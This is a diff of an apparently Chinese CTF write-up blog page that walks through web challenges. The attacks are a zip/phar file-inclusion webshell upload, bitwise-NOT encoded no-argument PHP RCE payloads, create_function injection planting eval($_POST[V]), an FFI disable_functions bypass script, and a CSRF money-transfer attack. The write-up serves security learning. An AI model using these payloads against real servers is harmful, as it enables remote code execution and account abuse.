+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;Files&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;status&#x27;</span>] === <span class="literal">true</span>)&#123;</span><br><span class="line">			<span class="variable">$tmp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;Files&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">			<span class="variable">$tmp_path</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;Files&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">			<span class="keyword">if</span>((<span class="variable">$extension</span> = pathinfo(<span class="variable">$tmp_file</span>)[<span class="string">&#x27;extension&#x27;</span>]) != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">				<span class="variable">$allows</span> = <span class="keyword">array</span>(<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>);</span><br><span class="line">				<span class="keyword">if</span>(in_array(<span class="variable">$extension</span>,<span class="variable">$allows</span>,<span class="literal">true</span>) <span class="keyword">and</span> in_array(<span class="variable">$_FILES</span>[<span class="string">&#x27;Files&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],array_map(<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$ext</span></span>)</span>&#123;<span class="keyword">return</span> <span class="string">&#x27;image/&#x27;</span>.<span class="variable">$ext</span>;&#125;,<span class="variable">$allows</span>),<span class="literal">true</span>))&#123;</span><br><span class="line">						<span class="variable">$upload_name</span> = sha1(md5(uniqid(microtime(<span class="literal">true</span>), <span class="literal">true</span>))).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$extension</span>;</span><br><span class="line">						move_uploaded_file(<span class="variable">$tmp_path</span>,<span class="string">&quot;assets/img/upload/&quot;</span>.<span class="variable">$upload_name</span>);</span><br><span class="line">						<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Update image -&gt; assets/img/upload/$&#123;upload_name&#125;&#x27;) &lt;/script&gt;&quot;</span>;</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Update illegal! Only allows like \&#x27;gif\&#x27;, \&#x27;jpeg\&#x27;, \&#x27;jpg\&#x27;, \&#x27;png\&#x27; &#x27;) &lt;/script&gt;&quot;</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>看到存在这么一段代码，文件上传，采用的是白名单，想到首页的文件包含，我们可以文件包含配合上传图片getshell，但是通过我们伪协议读取源码得知包含的时候会加上<code>.php</code>后缀，因此通过<code>zip://</code> 或者<code>phar://</code>协议来包含。利用过程：</p>
-<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">一句话木马-&gt;压缩为<span class="hljs-function"><span class="hljs-title">zip</span>文件-&gt;</span>修改后缀的<span class="hljs-function"><span class="hljs-title">jpg</span>-&gt;</span>利用<span class="hljs-function"><span class="hljs-title">zip</span>://或者phar://协议包含-&gt;</span>getshell<br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一句话木马-&gt;压缩为zip文件-&gt;修改后缀的jpg-&gt;利用zip:&#x2F;&#x2F;或者phar:&#x2F;&#x2F;协议包含-&gt;getshell</span><br></pre></td></tr></table></figure>
 
 <p>先传phpinfo测试，上传后路径：</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/assets/img</span><span class="hljs-regexp">/upload/</span>a4c4ab7e86ffb8ae7ebf44a377492d0b073e3b45.jpg<br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;assets&#x2F;img&#x2F;upload&#x2F;a4c4ab7e86ffb8ae7ebf44a377492d0b073e3b45.jpg</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">page</span>=zip://./assets/img/upload/a<span class="hljs-number">4</span>c<span class="hljs-number">4</span>ab<span class="hljs-number">7</span>e<span class="hljs-number">86</span>ffb<span class="hljs-number">8</span>ae<span class="hljs-number">7</span>ebf<span class="hljs-number">44</span>a<span class="hljs-number">377492</span>d<span class="hljs-number">0</span>b<span class="hljs-number">073</span>e<span class="hljs-number">3</span>b<span class="hljs-number">45</span>.jpg%<span class="hljs-number">231</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page&#x3D;zip:&#x2F;&#x2F;.&#x2F;assets&#x2F;img&#x2F;upload&#x2F;a4c4ab7e86ffb8ae7ebf44a377492d0b073e3b45.jpg%231</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420191913.png" srcset="/img/loading.gif" lazyload alt="image-20210420191850660"></p>
+<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420191913.png" alt="image-20210420191850660"></p>
 <p>然后上传一句话木马：</p>
-<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420192239.png" srcset="/img/loading.gif" lazyload alt="image-20210420192239458"></p>
-<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420192303.png" srcset="/img/loading.gif" lazyload alt="image-20210420192302961"></p>
+<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420192239.png" alt="image-20210420192239458"></p>
+<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420192303.png" alt="image-20210420192302961"></p>
 <p>利用phar协议：</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">page</span>=phar://./assets/img/upload/<span class="hljs-number">7</span>f<span class="hljs-number">9</span>dd<span class="hljs-number">8</span>cedfae<span class="hljs-number">86</span>b<span class="hljs-number">489906</span>d<span class="hljs-number">5126</span>b<span class="hljs-number">1</span>ccad<span class="hljs-number">949</span>bb<span class="hljs-number">11</span>b.jpg/<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page&#x3D;phar:&#x2F;&#x2F;.&#x2F;assets&#x2F;img&#x2F;upload&#x2F;7f9dd8cedfae86b489906d5126b1ccad949bb11b.jpg&#x2F;1</span><br></pre></td></tr></table></figure>
 
-<h3 id="WEB-rceme"><a href="#WEB-rceme" class="headerlink" title="[WEB]rceme"></a>[WEB]rceme</h3><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420192646.png" srcset="/img/loading.gif" lazyload alt="image-20210420192645927"></p>
+<h3 id="WEB-rceme"><a href="#WEB-rceme" class="headerlink" title="[WEB]rceme"></a>[WEB]rceme</h3><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420192646.png" alt="image-20210420192645927"></p>
 <p>执行命令前有一个验证，python脚本构造即可。查看源码发现提示 存在swp文件泄露：</p>
-<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420195400.png" srcset="/img/loading.gif" lazyload alt="image-20210420195400139"></p>
+<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420195400.png" alt="image-20210420195400139"></p>
 <p>下载恢复文件：</p>
-<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420195849.png" srcset="/img/loading.gif" lazyload></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>session_start();<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;code&#x27;</span>] = substr(md5(mt_rand().sha1(mt_rand)),<span class="hljs-number">0</span>,<span class="hljs-number">5</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br><br>        <span class="hljs-keyword">if</span>(substr(md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">5</span>) !== <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;code&#x27;</span>])&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;script&gt;alert(\&#x27;Captcha error~\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);<br>        &#125;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;code&#x27;</span>] = substr(md5(mt_rand().sha1(mt_rand)),<span class="hljs-number">0</span>,<span class="hljs-number">5</span>);<br>        <span class="hljs-variable">$code</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$code</span>) &gt; <span class="hljs-number">70</span> <span class="hljs-keyword">or</span> preg_match(<span class="hljs-string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/ixm&#x27;</span>,<span class="hljs-variable">$code</span>))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;script&gt;alert(\&#x27;Longlone not like you~\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$code</span>))&#123;<br>                @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>                <span class="hljs-keyword">die</span>();<br>        &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420195849.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>] = substr(md5(mt_rand().sha1(mt_rand)),<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(substr(md5(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]),<span class="number">0</span>,<span class="number">5</span>) !== <span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>])&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;Captcha error~\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>] = substr(md5(mt_rand().sha1(mt_rand)),<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">        <span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$code</span>) &gt; <span class="number">70</span> <span class="keyword">or</span> preg_match(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/ixm&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;Longlone not like you~\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>RCE限制长度小于等于70位</p>
 <p>限制特殊符号数字字母，不能用异或和或运算 —可以利用取反</p>
 <p>只允许无参数的函数传递进来，函数名只能为字母—利用无参数RCE</p>
 <p>关于无参数RCE不再详细分析，可参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9360">https://xz.aliyun.com/t/9360</a></p>
 <p>这里利用<code>getallheaders()</code> 先看一下位置：</p>
-<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">var_dump(getallheaders())<span class="hljs-comment">;</span><br>构造取反后：<br>(~<span class="hljs-variable">%89</span><span class="hljs-variable">%9</span>E<span class="hljs-variable">%8</span>D<span class="hljs-variable">%A0</span><span class="hljs-variable">%9</span>B<span class="hljs-variable">%8</span>A<span class="hljs-variable">%92</span><span class="hljs-variable">%8</span>F)((~<span class="hljs-variable">%98</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%8</span>B<span class="hljs-variable">%9</span>E<span class="hljs-variable">%93</span><span class="hljs-variable">%93</span><span class="hljs-variable">%97</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%9</span>E<span class="hljs-variable">%9</span>B<span class="hljs-variable">%9</span>A<span class="hljs-variable">%8</span>D<span class="hljs-variable">%8</span>C)())<span class="hljs-comment">;</span><br>但是本题目需要构造无参数：利用[!<span class="hljs-variable">%FF</span>]或者[!<span class="hljs-variable">%aa</span>]<br>[~<span class="hljs-variable">%89</span><span class="hljs-variable">%9</span>E<span class="hljs-variable">%8</span>D<span class="hljs-variable">%A0</span><span class="hljs-variable">%9</span>B<span class="hljs-variable">%8</span>A<span class="hljs-variable">%92</span><span class="hljs-variable">%8</span>F][!<span class="hljs-variable">%FF</span>]([~<span class="hljs-variable">%98</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%8</span>B<span class="hljs-variable">%9</span>E<span class="hljs-variable">%93</span><span class="hljs-variable">%93</span><span class="hljs-variable">%97</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%9</span>E<span class="hljs-variable">%9</span>B<span class="hljs-variable">%9</span>A<span class="hljs-variable">%8</span>D<span class="hljs-variable">%8</span>C][!<span class="hljs-variable">%FF</span>]())<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var_dump(getallheaders());</span><br><span class="line">构造取反后：</span><br><span class="line">(~%89%9E%8D%A0%9B%8A%92%8F)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)());</span><br><span class="line">但是本题目需要构造无参数：利用[!%FF]或者[!%aa]</span><br><span class="line">[~%89%9E%8D%A0%9B%8A%92%8F][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]());</span><br></pre></td></tr></table></figure>
 
 <p>注意提交要通过bp 不然会编码：</p>
-<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420204428.png" srcset="/img/loading.gif" lazyload alt="image-20210420204428016"></p>
+<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420204428.png" alt="image-20210420204428016"></p>
 <p>然后构造：<code>system(next(getallheaders()))</code></p>
-<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">system</span>(next(getallheaders()));<br>(~%8C%86%8C%8B%9A%92)((~%91%9A%87%8B)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)()))<br><br>[~%8C%86%8C%8B%9A%92][!%FF]([~%91%9A%87%8B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));<br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">system(next(getallheaders()));</span><br><span class="line">(~%8C%86%8C%8B%9A%92)((~%91%9A%87%8B)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)()))</span><br><span class="line"></span><br><span class="line">[~%8C%86%8C%8B%9A%92][!%FF]([~%91%9A%87%8B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420205602.png" srcset="/img/loading.gif" lazyload alt="image-20210420205601739"></p>
-<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420205818.png" srcset="/img/loading.gif" lazyload alt="image-20210420205818108"></p>
+<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420205602.png" alt="image-20210420205601739"></p>
+<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420205818.png" alt="image-20210420205818108"></p>
 <h3 id="WEB-FighterFightsInvincibly"><a href="#WEB-FighterFightsInvincibly" class="headerlink" title="[WEB]FighterFightsInvincibly"></a>[WEB]FighterFightsInvincibly</h3><p>直接view-source:</p>
-<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420211328.png" srcset="/img/loading.gif" lazyload alt="image-20210420211328195"></p>
+<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420211328.png" alt="image-20210420211328195"></p>
 <p>看到是动态代码执行，构造create_function代码注入，看下phpinfo：</p>
-<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">fighter</span>=create_function&amp;fights=&amp;invincibly=<span class="hljs-number">1</span><span class="hljs-comment">;&#125;phpinfo();/*</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fighter&#x3D;create_function&amp;fights&#x3D;&amp;invincibly&#x3D;1;&#125;phpinfo();&#x2F;*</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420212724.png" srcset="/img/loading.gif" lazyload alt="image-20210420212724022"></p>
+<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420212724.png" alt="image-20210420212724022"></p>
 <p>来个shell吧</p>
-<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">fighter</span>=create_function&amp;fights=&amp;invincibly=<span class="hljs-number">1</span><span class="hljs-comment">;&#125;eval($_POST[V]);/*</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fighter&#x3D;create_function&amp;fights&#x3D;&amp;invincibly&#x3D;1;&#125;eval($_POST[V]);&#x2F;*</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420212911.png" srcset="/img/loading.gif" lazyload alt="image-20210420212911179"></p>
+<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420212911.png" alt="image-20210420212911179"></p>
 <p>需要bypass，php版本7.4，利用php7.4 FFI实现用PHP代码调用C代码的方式执行命令。</p>
 <p>蚁剑绕过利用失败，采取手动方式：</p>
-<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420222116.png" srcset="/img/loading.gif" lazyload alt="image-20210420222116841"></p>
+<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420222116.png" alt="image-20210420222116841"></p>
 <p>flag读不全。其实还可以采用<a target="_blank" rel="noopener" href="https://whoamianony.top/2021/03/13/Web%E5%AE%89%E5%85%A8/Bypass%20Disable_functions/">FFI调用PHP源码中的函数</a></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*-coding:utf-8</span><br><br><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;http://daf3777d-58e5-4447-a849-b1a2ba7c1e9c.node3.buuoj.cn/&quot;</span><br><span class="hljs-comment">#data = &#123;&quot;fighter&quot;: &quot;create_function&quot;, &quot;fights&quot;: &quot;&quot;, &quot;invincibly&quot;: &quot;1;&#125;phpinfo();/*&quot;&#125;</span><br><span class="hljs-comment">#data = &#123;&quot;fighter&quot;: &quot;create_function&quot;, &quot;fights&quot;: &quot;&quot;, &quot;invincibly&quot;: &quot;&quot;&quot;1;&#125;$e=FFI::cdef(&quot;void *popen(char*,char*);\\nvoid pclose(void*);\\nint fgetc(void*);&quot;,&quot;libc.so.6&quot;);$o = $e-&gt;popen(&quot;/readflag&quot;,&quot;r&quot;);$d=&quot;&quot;;while(($c=$e-&gt;fgetc($o))!=-1)&#123;$d.=str_pad(strval(dechex($c)),2,&quot;0&quot;,0);&#125;$e-&gt;pclose($o);echo hex2bin($d);/*&quot;&quot;&quot;&#125;</span><br>data = &#123;<span class="hljs-string">&quot;fighter&quot;</span>: <span class="hljs-string">&quot;create_function&quot;</span>, <span class="hljs-string">&quot;fights&quot;</span>: <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;invincibly&quot;</span>: <span class="hljs-string">&quot;&quot;&quot;&#125;$e=FFI::cdef(&quot;int php_exec(int type, char *cmd);&quot;);$e-&gt;php_exec(3,$_REQUEST[&#x27;cmd&#x27;]);/*&quot;&quot;&quot;</span>&#125;<br><br>res = requests.post(url, data=data,params=&#123;<span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">&quot;/readflag&quot;</span>&#125;)<br><span class="hljs-built_in">print</span> (res.content)<br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://daf3777d-58e5-4447-a849-b1a2ba7c1e9c.node3.buuoj.cn/&quot;</span></span><br><span class="line"><span class="comment">#data = &#123;&quot;fighter&quot;: &quot;create_function&quot;, &quot;fights&quot;: &quot;&quot;, &quot;invincibly&quot;: &quot;1;&#125;phpinfo();/*&quot;&#125;</span></span><br><span class="line"><span class="comment">#data = &#123;&quot;fighter&quot;: &quot;create_function&quot;, &quot;fights&quot;: &quot;&quot;, &quot;invincibly&quot;: &quot;&quot;&quot;1;&#125;$e=FFI::cdef(&quot;void *popen(char*,char*);\\nvoid pclose(void*);\\nint fgetc(void*);&quot;,&quot;libc.so.6&quot;);$o = $e-&gt;popen(&quot;/readflag&quot;,&quot;r&quot;);$d=&quot;&quot;;while(($c=$e-&gt;fgetc($o))!=-1)&#123;$d.=str_pad(strval(dechex($c)),2,&quot;0&quot;,0);&#125;$e-&gt;pclose($o);echo hex2bin($d);/*&quot;&quot;&quot;&#125;</span></span><br><span class="line">data = &#123;<span class="string">&quot;fighter&quot;</span>: <span class="string">&quot;create_function&quot;</span>, <span class="string">&quot;fights&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;invincibly&quot;</span>: <span class="string">&quot;&quot;&quot;&#125;$e=FFI::cdef(&quot;int php_exec(int type, char *cmd);&quot;);$e-&gt;php_exec(3,$_REQUEST[&#x27;cmd&#x27;]);/*&quot;&quot;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url, data=data,params=&#123;<span class="string">&quot;cmd&quot;</span>: <span class="string">&quot;/readflag&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span> (res.content)</span><br></pre></td></tr></table></figure>
 
 <h3 id="WEB-flagshop"><a href="#WEB-flagshop" class="headerlink" title="[WEB]flagshop"></a>[WEB]flagshop</h3><p>环境不太顺畅..中间重新起了好几次环境。。</p>
 <p>这道题目考察的是CSRF，这种题目并不多，通过这个题目详细分析下这种漏洞。</p>
 <p>先了解一下：<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000006963312">CSRF 详解与攻防实战</a></p>
 <p>首先进入环境注册登录：</p>
-<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421113917911.png" srcset="/img/loading.gif" lazyload alt="image-20210421113917911"></p>
+<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421113917911.png" alt="image-20210421113917911"></p>
 <p>需要足够的钱购买flag。看一下怎么获得足够的钱，发现其有一个转账功能，与上文CSRF讲解的例子不谋而合同样是转账操作，其次还存在一个提交报告的地方，思路很明显了，就是构造恶意的链接，然后在提交报告处提交恶意链接，这样管理员查看报告就会自动转账：</p>
-<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421114229847.png" srcset="/img/loading.gif" lazyload alt="image-20210421114229847"></p>
+<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421114229847.png" alt="image-20210421114229847"></p>
 <p>看到Longlone用户，应该是利用CSRF让其给注册的用户转账，利用burp构造CSRF的POC放在vps上：</p>
-<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421114649186.png" srcset="/img/loading.gif" lazyload alt="image-20210421114649186"></p>
-<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421114910068.png" srcset="/img/loading.gif" lazyload alt="image-20210421114910068"></p>
+<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421114649186.png" alt="image-20210421114649186"></p>
+<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421114910068.png" alt="image-20210421114910068"></p>
 <p>POC修改一下，加一个脚本自动提交的代码，放在vps上index.html，然后提交报告：</p>
